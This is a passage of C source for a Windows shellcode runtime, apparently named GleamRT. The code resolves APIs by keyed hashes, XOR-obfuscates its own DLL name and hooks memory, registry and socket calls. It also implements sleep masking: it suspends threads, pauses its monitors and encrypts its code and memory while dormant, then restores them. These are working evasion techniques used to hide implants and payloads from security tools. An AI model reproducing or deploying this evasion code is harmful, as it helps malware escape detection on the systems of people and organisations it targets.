    errno errno = NO_ERROR;
    for (int i = 0; i < arrlen(list); i++)
    {
        if (!list[i].lock() && errno == NO_ERROR)
        {
            errno = list[i].errno;
        }
    }
    return errno;
}

__declspec(noinline)
errno RT_unlock_mods()
{
    Runtime* runtime = getRuntimePointer();

    typedef bool (*unlock_t)();
    typedef struct { 
        unlock_t unlock; errno errno;
    } submodule_t;

    submodule_t list[] = 
    {
        { runtime->ThreadTracker->Unlock,   ERR_RUNTIME_UNLOCK_THREAD   },
        { runtime->LibraryTracker->Unlock,  ERR_RUNTIME_UNLOCK_LIBRARY  },
        { runtime->MemoryTracker->Unlock,   ERR_RUNTIME_UNLOCK_MEMORY   },
        { runtime->ResourceTracker->Unlock, ERR_RUNTIME_UNLOCK_RESOURCE },
        { runtime->ArgumentStore->Unlock,   ERR_RUNTIME_UNLOCK_ARGUMENT },
        { runtime->InMemoryStorage->Unlock, ERR_RUNTIME_UNLOCK_STORAGE  },
        { runtime->WinHTTP->Unlock,         ERR_RUNTIME_UNLOCK_WIN_HTTP },
        { runtime->Sysmon->Unlock,          ERR_RUNTIME_UNLOCK_SYSMON   },
        { runtime->Watchdog->Unlock,        ERR_RUNTIME_UNLOCK_WATCHDOG },
    };

    errno errno = NO_ERROR;
    for (int i = 0; i < arrlen(list); i++)
    {
        if (!list[i].unlock() && errno == NO_ERROR)
        {
            errno = list[i].errno;
        }
    }
    return errno;
}

__declspec(noinline)
void RT_try_lock_mods()
{
    Runtime* runtime = getRuntimePointer();

    for (int i = 0; i < arrlen(runtime->ModMutexHandle); i++)
    {
        DWORD event = runtime->WaitForSingleObject(runtime->ModMutexHandle[i], 3000);
        if (event == WAIT_OBJECT_0 || event == WAIT_ABANDONED)
        {
            runtime->ModMutexStatus[i] = true;
        } else {
            runtime->ModMutexStatus[i] = false;
        }
    }
}

__declspec(noinline)
void RT_try_unlock_mods()
{
    Runtime* runtime = getRuntimePointer();

    for (int i = arrlen(runtime->ModMutexHandle) - 1; i >= 0; i--)
    {
        if (runtime->ModMutexStatus[i])
        {
            runtime->ReleaseMutex(runtime->ModMutexHandle[i]);
        }
    }
}

__declspec(noinline)
void RT_flush_api_cache()
{
    Runtime* runtime = getRuntimePointer();


}

__declspec(noinline)
uint MW_MemScanByValue(void* value, uint size, uintptr* results, uint maxItem)
{
    Runtime* runtime = getRuntimePointer();

    MemScan_Ctx ctx = {
        .MinAddress = (uintptr)(runtime->SysInfo.MinimumApplicationAddress),
        .MaxAddress = (uintptr)(runtime->SysInfo.MaximumApplicationAddress),

        .VirtualQuery = runtime->VirtualQuery,
    };
    return MemScanByValue(&ctx, value, size, results, maxItem);
}

__declspec(noinline)
uint MW_MemScanByPattern(byte* pattern, uintptr* results, uint maxItem)
{
    Runtime* runtime = getRuntimePointer();

    MemScan_Ctx ctx = {
        .MinAddress = (uintptr)(runtime->SysInfo.MinimumApplicationAddress),
        .MaxAddress = (uintptr)(runtime->SysInfo.MaximumApplicationAddress),

        .VirtualQuery = runtime->VirtualQuery,
    };
    return MemScanByPattern(&ctx, pattern, results, maxItem);
}

__declspec(noinline)
bool MW_WD_IsEnabled()
{
    Runtime* runtime = getRuntimePointer();

    return runtime->Watchdog->IsEnabled();
}

__declspec(noinline)
void* FindAPI_SC(uint module, uint procedure, uint key)
{
    Runtime* runtime = getRuntimePointer();

    return FindAPI_ML(runtime->IMOML, module, procedure, key);
}

__declspec(noinline)
void* FindAPI_SC_ML(void* list, uint module, uint procedure, uint key)
{
    // TODO implement spoof call
    return FindAPI_ML(list, module, procedure, key);
}

__declspec(noinline)
void* RT_FindAPI(uint module, uint procedure, uint key)
{
    return RT_GetProcAddressByHash(module, procedure, key, true);
}

__declspec(noinline)
void* RT_FindAPI_ML(void* list, uint module, uint procedure, uint key)
{
    return RT_GetProcAddressByHashML(list, module, procedure, key, true);
}

__declspec(noinline)
void* RT_FindAPI_A(byte* module, byte* procedure)
{                  
#ifdef _WIN64
    uint key = 0xA6C1B1E79D26D1E7;
#elif _WIN32
    uint key = 0x94645D8B;
#endif
    uint mHash = CalcModHash_A(module, key);
    uint pHash = CalcProcHash(procedure, key);
    return RT_GetProcAddressByHash(mHash, pHash, key, true);
}

__declspec(noinline)
void* RT_FindAPI_W(uint16* module, byte* procedure)
{
#ifdef _WIN64
    uint key = 0xA6C1B1E79D26D1E7;
#elif _WIN32
    uint key = 0x94645D8B;
#endif
    uint mHash = CalcModHash_W(module, key);
    uint pHash = CalcProcHash(procedure, key);
    return RT_GetProcAddressByHash(mHash, pHash, key, true);
}

__declspec(noinline)
void* RT_GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    return RT_GetProcAddressByName(hModule, lpProcName, true);
}

__declspec(noinline)
void* RT_GetProcAddressByName(HMODULE hModule, LPCSTR lpProcName, bool redirect)
{
    Runtime* runtime = getRuntimePointer();

    // process ordinal import
    if (lpProcName < (LPCSTR)(0xFFFF))
    {
        if (hModule == HMODULE_GLEAM_RT)
        {
            SetLastErrno(ERR_RUNTIME_INVALID_HMODULE);
            return NULL;
        }
        return runtime->GetProcAddress(hModule, lpProcName);
    }
    // use "mem_init" for prevent incorrect compiler
    // optimize and generate incorrect shellcode
    uint16 module[MAX_PATH];
    mem_init(module, sizeof(module));
    // get module file name
    if (hModule == HMODULE_GLEAM_RT)
    {
        uint16 mod[] = {
            L'G'^0xA3EB, L'l'^0xCD20, L'e'^0x67F4, L'a'^0x19B2, 
            L'm'^0xA3EB, L'R'^0xCD20, L'T'^0x67F4, L'.'^0x19B2, 
            L'd'^0xA3EB, L'l'^0xCD20, L'l'^0x67F4, 0000^0x19B2,
        };
        uint16 key[] = { 0xA3EB, 0xCD20, 0x67F4, 0x19B2 };
        XORBuf(mod, sizeof(mod), key, sizeof(key));
        mem_copy(module, mod, sizeof(mod));
    } else {
        if (GetModuleFileName(runtime->IMOML, hModule, module, sizeof(module)) == 0)
        {
            SetLastErrno(ERR_RUNTIME_NOT_FOUND_MODULE);
            return NULL;
        }
    }
    // check is runtime internal methods
    void* method = getRuntimeMethods(module, lpProcName);
    if (method != NULL)
    {
        return method;
    }
    // generate hash for get Windows API address
#ifdef _WIN64
    uint key = 0xA6C1B1E79D26D1E7;
#elif _WIN32
    uint key = 0x94645D8B;
#endif
    uint mHash = CalcModHash_W((uint16*)(module), key);
    uint pHash = CalcProcHash((byte*)lpProcName, key);
    // try to find Windows API by hash
    void* proc = RT_GetProcAddressByHash(mHash, pHash, key, redirect);
    if (proc != NULL)
    {
        return proc;
    }
    // if all not found, use native GetProcAddress
    if (hModule == HMODULE_GLEAM_RT)
    {
        SetLastErrno(ERR_RUNTIME_NOT_FOUND_METHOD);
        return NULL;
    }
    return runtime->GetProcAddress(hModule, lpProcName);
}

__declspec(noinline)
void* RT_GetProcAddressByHash(uint mHash, uint pHash, uint hKey, bool redirect)
{
    Runtime* runtime = getRuntimePointer();

    return RT_GetProcAddressByHashML(runtime->IMOML, mHash, pHash, hKey, redirect);
}

__declspec(noinline)
void* RT_GetProcAddressByHashML(void* list, uint mHash, uint pHash, uint hKey, bool redirect)
{
    Runtime* runtime = getRuntimePointer();

    void* proc = FindAPI_SC_ML(list, mHash, pHash, hKey);
    if (proc == NULL)
    {
        return NULL;
    }
    if (!redirect)
    {
        return proc;
    }
    void* rdr = getAPIRedirector(runtime, proc);
    if (rdr != NULL)
    {
        return rdr;
    }
    rdr = getLazyAPIRedirector(runtime, proc);
    if (rdr != NULL)
    {
        return rdr;
    }
    return proc;
}

// disable optimize for use call NOT jmp to runtime->GetProcAddress.
#pragma optimize("", off)
void* RT_GetProcAddressOriginal(HMODULE hModule, LPCSTR lpProcName)
{
    Runtime* runtime = getRuntimePointer();

    return runtime->GetProcAddress(hModule, lpProcName);
}
#pragma optimize("", on)

// getRuntimeMethods is used to obtain runtime internal methods,
// such as GetProcAddress, ExitProcess and submodule methods.
// 
// HMODULE hGleamRT = LoadLibraryA("GleamRT.dll");
// ArgGetValue_t AS_GetValue = GetProcAddress(hGleamRT, "AS_GetValue");
static void* getRuntimeMethods(LPCWSTR module, LPCSTR lpProcName)
{
    Runtime* runtime = getRuntimePointer();

    ArgumentStore_M*   AS = runtime->ArgumentStore;
    InMemoryStorage_M* IS = runtime->InMemoryStorage;
    Sysmon_M*          SM = runtime->Sysmon;
    Watchdog_M*        WD = runtime->Watchdog;

    typedef struct {
        uint mHash; uint pHash; uint hKey; void* method;
    } method;
    method list[] =
#ifdef _WIN64
    {
        { 0x8CDF6BCCACFF5ECA, 0x4BC9F3FE3B59678C, 0x23173EFE31305341, GetFuncAddr(&RT_GetProcAddressByName)   },
        { 0xF395D014FC4A9847, 0x2D6352C01B64C8CD, 0x02E1C76F946DD411, GetFuncAddr(&RT_GetProcAddressByHash)   },
        { 0xD6B7CE32BE36AE15, 0x8C40B58C324BF998, 0x2EC1D940231B43F6, GetFuncAddr(&RT_GetProcAddressByHashML) },
        { 0x3AB89D3D84B47DFE, 0x667F961CE2D5EE7A, 0x43BD143E1D761DB4, GetFuncAddr(&RT_GetProcAddressOriginal) },
        { 0x87C47270364481C7, 0x0F85CE174F27B497, 0x42E184C4D600AB3B, GetFuncAddr(&RT_ExitProcess)            },
        { 0x77FDDBA2139EE0B2, 0xD6697FF6099F7A3E, 0xE1F0A0A5A30EBBA5, GetFuncAddr(&RT_GetPEB)                 },
        { 0x441F60BF21A3BBAD, 0x83C43C17A206D106, 0x9DEEE3CB173F1F9E, GetFuncAddr(&RT_GetTEB)                 },
        { 0xF6E648984B4A7151, 0xE74FFBB9CA4DE14A, 0xF8596B745EFC93EA, GetFuncAddr(&RT_GetIMOML)               },
        { 0x8297D36EE43D98B8, 0x5CC0ED58C88E507B, 0x48701A09531A893B, GetFuncAddr(&RT_GetMetrics)             },
        { 0x172EB189DC662FCA, 0x0406D1ED1D897C2E, 0x11974ED8D65FEA41, AS->GetValue   }, // AS_GetValue
        { 0xA884D08380DBB048, 0xBD7F30E36376638E, 0xDA5805C2D8B16DCE, AS->GetPointer }, // AS_GetPointer
        { 0x777977B4AE250D4F, 0x032B55E616810E84, 0x8606E6C48610C9A8, AS->Erase      }, // AS_Erase
        { 0x9BCB981B023D8DC2, 0x1DFCCEAD651F9B13, 0xD65D0195182A03E1, AS->EraseAll   }, // AS_EraseAll
        { 0xCF596C48439AC8D9, 0x5ECE49DC91D671C6, 0xE1EA7702BE4D4C22, IS->SetValue   }, // IS_SetValue
        { 0x621CC1A89E9F8B68, 0x704987B8E70F74E4, 0x968F7E69F7B7A703, IS->GetValue   }, // IS_GetValue
        { 0x7A2F02E9472A6B4C, 0xB39AF5ACF1986924, 0xFC3098BE0DDFCEB9, IS->GetPointer }, // IS_GetPointer
        { 0xC33D496665F15E79, 0x0AB50841540975E5, 0x15370ED87A82E6D9, IS->Delete     }, // IS_Delete
        { 0xAF239943E7539B6D, 0xE17D724F9945D888, 0x1071FD5143C55971, IS->DeleteAll  }, // IS_DeleteAll
        { 0x82216EF8B41FA151, 0x6607CDBDCF13CB3A, 0xFA9DF9D380BF1C1D, SM->Pause      }, // SM_Pause
        { 0x555D764BE9610F60, 0xE2A53FFB78A3D65F, 0xC2C721E343F55454, SM->Continue   }, // SM_Continue
        { 0x1F832C6CB8DF6133, 0x17E85FF98FA3DE49, 0x47A5C8F4268DBCBB, WD->Kick       }, // WD_Kick
        { 0x2CC54142939DF1CD, 0x17CCD13B74E5BD4E, 0xB68C4DA23D4E97EA, WD->Enable     }, // WD_Enable
        { 0x6A068C1FEDA531A6, 0x0E703295C00BB31C, 0x2B66D21CA04C1B46, WD->Disable    }, // WD_Disable
        { 0x8BBD68697171657A, 0x16AAF7ACBFDE688C, 0x4A903075B3618895, WD->IsEnabled  }, // WD_IsEnabled
        { 0x5E43342F61130B3C, 0xCFD5C2327927D96C, 0x592DCAB6E0E3AF86, WD->SetHandler }, // WD_SetHandler
        { 0x63BC77634D5E0E9D, 0x8E64FFE3439A4630, 0xACFC6A9743F69813, WD->Pause      }, // WD_Pause
        { 0xFCB2D70109AD55A3, 0x2C2A42D0F8090A2D, 0xB6EDE7B7946586E9, WD->Continue   }, // WD_Continue
    };
#elif _WIN32
    {
        { 0xB45C0CFA, 0x2A5E9BBD, 0x15D1E23E, GetFuncAddr(&RT_GetProcAddressByName)   },
        { 0x7431D137, 0x86263112, 0x01401C56, GetFuncAddr(&RT_GetProcAddressByHash)   },
        { 0x6411C109, 0x7D9578EB, 0xACD88A68, GetFuncAddr(&RT_GetProcAddressByHashML) },
        { 0x46AE0C6F, 0x9CA280BD, 0xE68B3680, GetFuncAddr(&RT_GetProcAddressOriginal) },
        { 0x8ABE078B, 0xD3D543F1, 0xE132AE7B, GetFuncAddr(&RT_ExitProcess)            },
        { 0xC204A230, 0xDAA40F54, 0x277959C8, GetFuncAddr(&RT_GetPEB)                 },
        { 0x7084BF94, 0x0B8D1B33, 0x77115B80, GetFuncAddr(&RT_GetTEB)                 },
        { 0xF8D5E5F2, 0x49036983, 0xF3AF827C, GetFuncAddr(&RT_GetIMOML)               },
        { 0x2674137F, 0xD79A5D69, 0xB3C0A554, GetFuncAddr(&RT_GetMetrics)             },
        { 0x2859483E, 0xBF4749F4, 0xCBEAF70B, AS->GetValue   }, // AS_GetValue
        { 0xD2432243, 0x85A16057, 0xF762BF9F, AS->GetPointer }, // AS_GetPointer
        { 0xB115F50E, 0xD1879F7C, 0xDB1CB9F6, AS->Erase      }, // AS_Erase
        { 0x58F68F24, 0x1B504FA3, 0x4E62C4D7, AS->EraseAll   }, // AS_EraseAll
        { 0xECB1ACB0, 0x4B4C9920, 0xDD8ADF4E, IS->SetValue   }, // IS_SetValue
        { 0xDA7A10AE, 0xE5A612BF, 0xA41F7425, IS->GetValue   }, // IS_GetValue
        { 0xEE91CD4F, 0x2EBA17AE, 0x67B0C201, IS->GetPointer }, // IS_GetPointer
        { 0xD4E677A9, 0xDFA59DC0, 0x33A7EB51, IS->Delete     }, // IS_Delete
        { 0x23A94E72, 0x22A1B412, 0xD86D4A3B, IS->DeleteAll  }, // IS_DeleteAll
        { 0xEC9FDAA4, 0xF05F8702, 0x550FD573, SM->Pause      }, // SM_Pause
        { 0xB3D350A9, 0xF1C68904, 0xBBD5FB89, SM->Continue   }, // SM_Continue
        { 0x74153A99, 0x1104477F, 0x7012B5BD, WD->Kick       }, // WD_Kick
        { 0xED75D7C9, 0x66E51765, 0xE8913E72, WD->Enable     }, // WD_Enable
        { 0xC5150916, 0x7ECD2BA6, 0x5CE6A01B, WD->Disable    }, // WD_Disable
        { 0x891B90D5, 0x5D354832, 0x359D27F4, WD->IsEnabled  }, // WD_IsEnabled
        { 0xCCB874B6, 0x14974E8E, 0xD373B540, WD->SetHandler }, // WD_SetHandler
        { 0x2458D941, 0xA02EF77B, 0xFD9F77F6, WD->Pause      }, // WD_Pause
        { 0x77753D1A, 0xA8072E02, 0xA25C2C36, WD->Continue   }, // WD_Continue
    };
#endif
    for (int i = 0; i < arrlen(list); i++)
    {
        method item = list[i];
        uint mHash = CalcModHash_W((uint16*)(module), item.hKey);
        if (mHash != item.mHash)
        {
            continue;
        }
        uint pHash = CalcProcHash((byte*)lpProcName, item.hKey);
        if (pHash != item.pHash)
        {
            continue;
        }
        return item.method;
    }
    return NULL;
}

static void* getAPIRedirector(Runtime* runtime, void* proc)
{
    for (int i = 0; i < arrlen(runtime->Redirectors); i++)
    {
        API_RDR rdr = runtime->Redirectors[i];
        if (rdr.src != proc)
        {
            continue;
        }
        return rdr.dst;
    }
    return NULL;
}

// getLazyAPIRedirector is used to FindAPI after call LoadLibrary.
// Redirectors in initAPIRedirector() are all in kernel32.dll.
static void* getLazyAPIRedirector(Runtime* runtime, void* proc)
{
    MemoryTracker_M*   MT = runtime->MemoryTracker;
    ResourceTracker_M* RT = runtime->ResourceTracker;

    typedef struct {
        uint mHash; uint pHash; uint hKey; void* api;
    } rdr;
    rdr list[] =
#ifdef _WIN64
    {
        { 0x5254CA58A04C6861, 0x13B5CA12DD915BFF, 0x90E47B3ACA936DDF, MT->msvcrt_malloc    },
        { 0x4F5F3C8E02424715, 0x2DE690AE65E7CA95, 0xF19FC35BA1098695, MT->msvcrt_calloc    },
        { 0xAFB8889578B00466, 0xA8B9D01521BE59A8, 0x56797427ADC736F5, MT->msvcrt_realloc   },
        { 0xE7C6D3E8F64212DB, 0xDCE3F452DF107F71, 0xB8A2CB36A709EF6F, MT->msvcrt_free      },
        { 0xC1E9BA292B4AE7A4, 0x0C064C9575BCF15B, 0xC4999748966A9858, MT->msvcrt_msize     },
        { 0xAA909AD9DB1B157E, 0xA5E606AF657B5E09, 0x5546D5EF6EBD88F4, MT->ucrtbase_malloc  },
        { 0xE45A40568AD159B2, 0xDFAFAC2C1531A19D, 0xB25BA66565A7746C, MT->ucrtbase_calloc  },
        { 0x79F4536182B35D04, 0x6FDB742B0500FBE3, 0x23CA792DFEE7E60B, MT->ucrtbase_realloc },
        { 0xAED68A03A785FA47, 0xD5B8EA4569EA5C32, 0xDED2EB337D9116BC, MT->ucrtbase_free    },
        { 0x03497789B54E7CA9, 0xFF4EE05FAFBAC456, 0x567A7168C11256EE, MT->ucrtbase_msize   },
        { 0x625DD62ED359C958, 0x3091FBE2377A1176, 0x22A27DECEAF2266F, RT->RegCreateKeyA    },
        { 0x7B698BFB22192AA3, 0xEA50E9DC003C8EA2, 0x950CD32D7E2121B8, RT->RegCreateKeyW    },
        { 0x41F5B7D40FB03A4B, 0xC708FE55618EAE52, 0x51D5149B4857934B, RT->RegCreateKeyExA  },
        { 0xB4C76DDCB73696B4, 0xA7A86DB8B2DD33B9, 0x98E110EE82D21BDD, RT->RegCreateKeyExW  },
        { 0x36051AE7E56AAECE, 0x321942AA68DD9653, 0x0F536179870DF295, RT->RegOpenKeyA      },
        { 0x3385B5A869495B06, 0x5805A4074843E065, 0xD47A4EC8E0FF8E99, RT->RegOpenKeyW      },
        { 0x6EA9DF91C3CDCE6B, 0xA212700247963F1E, 0xF7B9272CA7F2B111, RT->RegOpenKeyExA    },
        { 0x7E7F92C8D608D302, 0xC3AFBAD56325AAF8, 0x2FF2F4B325AB0D60, RT->RegOpenKeyExW    },
        { 0xD178185E7C76C08B, 0x4374BF609B14CECE, 0x847060A18FB337BC, RT->RegCloseKey      },
        { 0x43915A5C5D2EEFAD, 0x2C190CCAB8AF60EE, 0xC5BEBEF2DB5B6ADB, RT->WSAStartup       },
        { 0x9E03289691D1AC6D, 0x64663633D27E11B2, 0x70ACEA9F645A4CAD, RT->WSACleanup       },
        { 0x10BE0476CCD0949A, 0x65AB8A1BB8C93451, 0x5094B7750A4EEF9D, RT->WSASocketA       },
        { 0x991A160A43356D61, 0x4A5AD3FA8260D517, 0xE9AC8B5A6007860D, RT->WSASocketW       },
        { 0x6D3AE16372B1A0DB, 0x0F9CD5C024047F6F, 0xAAC7634A7F85F581, RT->WSAIoctl         },
        { 0x7736E0C240C9B448, 0xE69F48EBE315D71D, 0x71CF1A836E0A477C, RT->socket           },
        { 0x5BAFA015C25A8294, 0xF9276424913FC0E2, 0xC2D98F6758BE8E93, RT->accept           },
        { 0x4317E765A5C19858, 0x8AF7DA94AE27ADFB, 0xC9BE98972D22AFA7, RT->shutdown         },
        { 0x0F5B6F87DA763249, 0x8C1307AA01358E71, 0xC24A6EE00FDC1A9E, RT->closesocket      },
    };
#elif _WIN32
    {
        { 0x779E8E68, 0xC28F9C78, 0x742FAD69, MT->msvcrt_malloc    },
        { 0xF72036C1, 0xA187A89D, 0x0A468719, MT->msvcrt_calloc    },
        { 0x51F6F0AF, 0xD8427F9B, 0x161B5A2A, MT->msvcrt_realloc   },
        { 0xC0AE317A, 0xB2CBF2E1, 0x3A6F2FEF, MT->msvcrt_free      },
        { 0x470C76A8, 0x985FAB1A, 0x6A95FAA9, MT->msvcrt_msize     },
        { 0xBF0F01E4, 0x840E093C, 0xA7A90445, MT->ucrtbase_malloc  },
        { 0xB00F91E3, 0xAD87A573, 0x8B4E88EB, MT->ucrtbase_calloc  },
        { 0xCD03B519, 0xF4D21253, 0x51493B49, MT->ucrtbase_realloc },
        { 0x493A8A6C, 0xA862B408, 0x24314545, MT->ucrtbase_free    },
        { 0x2017A8CC, 0xD163E2C6, 0xFCB661CE, MT->ucrtbase_msize   },
        { 0x22355E5D, 0xE1A90917, 0xADE97876, RT->RegCreateKeyA    },
        { 0x07F34B77, 0xC766F647, 0x45557C5C, RT->RegCreateKeyW    },
        { 0x5E5746DB, 0xCA92BD13, 0xA3360B59, RT->RegCreateKeyExA  },
        { 0x83D55FB4, 0x98C92D4A, 0x69B59766, RT->RegCreateKeyExW  },
        { 0x6A9426C0, 0x53C33F65, 0x13ECFAA3, RT->RegOpenKeyA      },
        { 0x63DE6FAA, 0x1A6BBB07, 0x033261DF, RT->RegOpenKeyW      },
        { 0xF3B62990, 0x95170248, 0x181E2275, RT->RegOpenKeyExA    },
        { 0x84BCAAAF, 0x261D837D, 0xFA0FFFDA, RT->RegOpenKeyExW    },
        { 0x18E3E426, 0x901A72E3, 0x24A3A166, RT->RegCloseKey      },
        { 0x131590EA, 0x18C9638C, 0x60893AC1, RT->WSAStartup       },
        { 0xB3174609, 0x28E27407, 0xE9139041, RT->WSACleanup       },
        { 0x0B305DC1, 0xD03A3A72, 0x4AE762DC, RT->WSASocketA       },
        { 0x4A6DD610, 0x13DB0032, 0xF7657ED7, RT->WSASocketW       },
        { 0xE4A294EC, 0x86DBB084, 0x151427B4, RT->WSAIoctl         },
        { 0xB23F6E3E, 0xAF3DA115, 0xC156AB6D, RT->socket           },
        { 0x31ABD834, 0xDE2BAF2B, 0x19EB6D1E, RT->accept           },
        { 0x9BAB4EBA, 0x494E2BD1, 0x101223CE, RT->shutdown         },
        { 0x209A93DA, 0x6008F821, 0x6A713103, RT->closesocket      },
    };
#endif
    for (int i = 0; i < arrlen(list); i++)
    {
        rdr item = list[i]; 
        if (FindAPI_SC(item.mHash, item.pHash, item.hKey) != proc)
        {
            continue;
        }
        return item.api;
    }
    return NULL;
}

__declspec(noinline)
void* RT_GetPEB()
{
    Runtime* runtime = getRuntimePointer();

    return runtime->PEB;
}

__declspec(noinline)
void* RT_GetTEB()
{
#ifdef _WIN64
    uintptr teb = __readgsqword(0x30);
#elif _WIN32
    uintptr teb = __readfsdword(0x18);
#endif
    return (void*)teb;
}

__declspec(noinline)
void* RT_GetIMOML()
{
    Runtime* runtime = getRuntimePointer();

    return runtime->IMOML;
}

__declspec(noinline)
BOOL RT_SetCurrentDirectoryA(LPSTR lpPathName)
{
    Runtime* runtime = getRuntimePointer();

    dbg_log("[runtime]", "SetCurrentDirectoryA: %s", lpPathName);

    // for call SetLastError
    if (lpPathName == NULL)
    {
        return runtime->SetCurrentDirectoryA(lpPathName);
    }

    if (*lpPathName != '*')
    {
        return true;
    }
    return runtime->SetCurrentDirectoryA(++lpPathName);
}

__declspec(noinline)
BOOL RT_SetCurrentDirectoryW(LPWSTR lpPathName)
{
    Runtime* runtime = getRuntimePointer();

    dbg_log("[runtime]", "SetCurrentDirectoryW: %ls", lpPathName);

    // for call SetLastError
    if (lpPathName == NULL)
    {
        return runtime->SetCurrentDirectoryW(lpPathName);
    }

    if (*lpPathName != L'*')
    {
        return true;
    }
    return runtime->SetCurrentDirectoryW(++lpPathName);
}

__declspec(noinline)
void RT_Sleep(DWORD dwMilliseconds)
{
    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return;
    }

    ThdSleep_t Sleep = runtime->ThreadTracker->Sleep;

    if (!rt_unlock())
    {
        return;
    }

    Sleep(dwMilliseconds);
}

__declspec(noinline)
DWORD RT_SleepEx(DWORD dwMilliseconds, BOOL bAlertable)
{
    if (!bAlertable)
    {
        RT_SleepHR(dwMilliseconds);
        return 0;
    }

    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return 0;
    }

    SleepEx_t sleepEx = runtime->SleepEx;

    if (!rt_unlock())
    {
        return 0;
    }
    return sleepEx(dwMilliseconds, bAlertable);
}

__declspec(noinline)
void RT_ExitProcess(UINT uExitCode)
{
    Runtime* runtime = getRuntimePointer();

    runtime->ExitProcess(uExitCode);
}

__declspec(noinline)
errno RT_SleepHR(DWORD dwMilliseconds)
{
    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return ERR_RUNTIME_LOCK;
    }
    errno errlm = RT_lock_mods();
    if (errlm != NO_ERROR)
    {
        return errlm;
    }

    if (dwMilliseconds <= 100)
    {
        // prevent sleep too frequent
        dwMilliseconds = 100;
    } else {
        // make sure the sleep time is a multiple of 1s
        dwMilliseconds = (dwMilliseconds / 1000) * 1000;
        if (dwMilliseconds == 0)
        {
            dwMilliseconds = 1000;
        }
    }

    // for test submodule faster
#ifndef RELEASE_MODE
    dwMilliseconds = 5 + (DWORD)RandUintN(0, 50);
#endif

    HANDLE hTimer = NULL;
    errno  error  = NO_ERROR;
    for (;;)
    {
        // create and set waitable timer
        hTimer = runtime->CreateWaitableTimerA(NULL, false, NAME_RT_TIMER_SLEEPHR);
        if (hTimer == NULL)
        {
            error = ERR_RUNTIME_CREATE_WAITABLE_TIMER;
            break;
        }
        int64 dueTime = -((int64)dwMilliseconds * 1000 * 10);
        if (!runtime->SetWaitableTimer(hTimer, &dueTime, 0, NULL, NULL, true))
        {
            error = ERR_RUNTIME_SET_WAITABLE_TIMER;
            break;
        }
        errno err = hide(runtime);
        if (err != NO_ERROR)
        {
            if (!(err & ERR_FLAG_CAN_IGNORE) && error == NO_ERROR)
            {
                error = err;
            }
        }
        err = sleep(runtime, hTimer);
        if (err != NO_ERROR)
        {
            if (!(err & ERR_FLAG_CAN_IGNORE) && error == NO_ERROR)
            {
                error = err;
            }
        }
        err = recover(runtime);
        if (err != NO_ERROR)
        {
            if (!(err & ERR_FLAG_CAN_IGNORE) && error == NO_ERROR)
            {
                error = err;
            }
        }
        break;
    }

    // clean created waitable timer
    if (hTimer != NULL)
    {
        if (!runtime->CloseHandle(hTimer) && error == NO_ERROR)
        {
            error = ERR_RUNTIME_CLOSE_WAITABLE_TIMER;
        }
    }

    errno errum = RT_unlock_mods();
    if (errum != NO_ERROR)
    {
        return errum;
    }
    if (!rt_unlock())
    {
        return ERR_RUNTIME_UNLOCK;
    }
    return error;
}

__declspec(noinline)
static errno hide(Runtime* runtime)
{
    typedef errno (*submodule_t)();
    submodule_t submodules[] = {
        runtime->ThreadTracker->Suspend,

        runtime->Watchdog->Pause,
        runtime->Sysmon->Pause,

        runtime->WinHTTP->Clean,
        runtime->WinCrypto->Clean,

        runtime->LibraryTracker->Encrypt,
        runtime->MemoryTracker->Encrypt,
        runtime->ResourceTracker->Encrypt,
        runtime->ArgumentStore->Encrypt,
        runtime->InMemoryStorage->Encrypt,
    };
    errno err = NO_ERROR;
    for (int i = 0; i < arrlen(submodules); i++)
    {
        errno enmod = submodules[i]();
        if (enmod != NO_ERROR && err == NO_ERROR)
        {
            err = enmod;
        }
    }
    return err;
}

__declspec(noinline)
static errno recover(Runtime* runtime)
{
    typedef errno (*submodule_t)();
    submodule_t submodules[] = {
        runtime->InMemoryStorage->Decrypt,
        runtime->ArgumentStore->Decrypt,
        runtime->ResourceTracker->Decrypt,
        runtime->MemoryTracker->Decrypt,
        runtime->LibraryTracker->Decrypt,

        runtime->Sysmon->Continue,
        runtime->Watchdog->Continue,

        runtime->ThreadTracker->Resume,
    };
    errno err = NO_ERROR;
    for (int i = 0; i < arrlen(submodules); i++)
    {
        errno enmod = submodules[i]();
        if (enmod != NO_ERROR && err == NO_ERROR)
        {
            err = enmod;
        }
    }
    return err;
}

__declspec(noinline)
static errno sleep(Runtime* runtime, HANDLE hTimer)
{
    // calculate begin and end address
    uintptr beginAddress = (uintptr)(runtime->Options.BootInstAddress);
    uintptr runtimeAddr  = (uintptr)(GetFuncAddr(&InitRuntime));
    if (beginAddress == 0 || beginAddress > runtimeAddr)
    {
        beginAddress = runtimeAddr;
    }
    uintptr endAddress = (uintptr)(runtime->Epilogue);
    // must adjust protect before call shield stub // TODO update protect
    void* addr = (void*)beginAddress;
    DWORD size = (DWORD)(endAddress - beginAddress);
    DWORD oldProtect;
    if (!runtime->VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &oldProtect))
    {
        return ERR_RUNTIME_ADJUST_PROTECT;
    }
    // build shield context before encrypt main memory page
    Shield_Ctx ctx = {
        .BeginAddress = beginAddress,
        .EndAddress   = endAddress,
        .hTimer       = hTimer,

        .WaitForSingleObject = runtime->WaitForSingleObject,
    };
    RandBuffer(ctx.CryptoKey, sizeof(ctx.CryptoKey));
    // encrypt main page
    void* buf = runtime->MainMemPage;
    byte key[CRYPTO_KEY_SIZE];
    byte iv [CRYPTO_IV_SIZE];
    RandBuffer(key, CRYPTO_KEY_SIZE);
    RandBuffer(iv,  CRYPTO_IV_SIZE);
    EncryptBuf(buf, MAIN_MEM_PAGE_SIZE, key, iv);
    // call shield!!!
    if (!DefenseRT(&ctx))
    {
        // TODO if failed to defense, need to recover them
        return ERR_RUNTIME_DEFENSE_RT;
    }
    // decrypt main page
    DecryptBuf(buf, MAIN_MEM_PAGE_SIZE, key, iv);
    // TODO remove this call, stub will adjust it
    if (!runtime->VirtualProtect(addr, size, oldProtect, &oldProtect))
    {
        return ERR_RUNTIME_RECOVER_PROTECT;
    }
    // flush instruction cache after decrypt
    void* baseAddr = (void*)beginAddress;
    uint  instSize = (uint)size;
    if (!runtime->FlushInstructionCache(CURRENT_PROCESS, baseAddr, instSize))
    {
        return ERR_RUNTIME_FLUSH_INST_CACHE;
    }
    return NO_ERROR;
}

__declspec(noinline)
errno RT_Hide()
{
    Runtime* runtime = getRuntimePointer();

    if (!rt_lock())
    {
        return ERR_RUNTIME_LOCK;
    }
